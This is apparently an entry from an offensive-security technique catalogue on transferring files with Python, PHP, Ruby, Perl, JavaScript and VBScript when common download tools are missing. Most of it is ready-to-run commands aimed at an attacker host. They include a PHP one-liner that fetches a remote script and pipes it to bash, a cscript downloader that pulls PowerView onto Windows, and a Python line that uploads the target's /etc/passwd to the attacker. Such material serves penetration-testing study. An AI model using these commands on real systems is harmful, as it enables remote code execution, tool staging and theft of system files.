---
tool: File transfer with code
slug: transfer-with-code
kind: technique
stages: [delivery]
category: Download and upload with a language runtime
platforms: [linux, windows]
services: [http, https]
ports: [80, 443, 8000]
tags: [file-transfer, python, php, ruby, perl, javascript, vbscript]
attack: [T1105, T1059]
summary: When the usual tools are missing but a language runtime is present. Python, PHP, Ruby, Perl, JavaScript and VBScript all run one-line downloaders, and Python also uploads.
references:
  - Python uploadserver | https://github.com/Densaugeo/uploadserver
  - LOLBAS cscript | https://lolbas-project.github.io/lolbas/Binaries/Cscript/
---

## When to reach for it

No `wget`, `curl` or `certutil`, but the box has Python, PHP or similar (common on Linux, sometimes on Windows). Run a one-liner in the language that is there.

## Download

```bash
# Python (2 or 3)
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://10.10.14.5/f","f")'
python2.7 -c 'import urllib;urllib.urlretrieve("http://10.10.14.5/f","f")'

# PHP
php -r '$f=file_get_contents("http://10.10.14.5/f");file_put_contents("f",$f);'
php -r '$l=@file("http://10.10.14.5/x.sh");foreach($l as $n){echo $n;}' | bash   # fileless

# Ruby and Perl
ruby -e 'require "net/http";File.write("f",Net::HTTP.get(URI.parse("http://10.10.14.5/f")))'
perl -e 'use LWP::Simple;getstore("http://10.10.14.5/f","f");'
```

## Windows with JavaScript or VBScript

```javascript
// save as wget.js, run: cscript.exe /nologo wget.js <url> <outfile>
var r=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
r.Open("GET",WScript.Arguments(0),false);r.Send();
var s=new ActiveXObject("ADODB.Stream");s.Type=1;s.Open();
s.Write(r.ResponseBody);s.SaveToFile(WScript.Arguments(1));
```

```text
C:\> cscript.exe /nologo wget.js http://10.10.14.5/PowerView.ps1 PowerView.ps1
```

## Upload with Python

```bash
# On your box: a server that accepts POST /upload
python3 -m uploadserver
# On the target: post a file
python3 -c 'import requests;requests.post("http://10.10.14.5:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## Notes

Pick whatever interpreter the target already has: `python3 --version`, `php -v`, `ruby -v`, `perl -v`. `cscript`/`mshta` run JavaScript or VBScript on Windows and are classic living-off-the-land binaries. For bigger jobs, write the download or upload as a short script rather than fighting a one-liner.
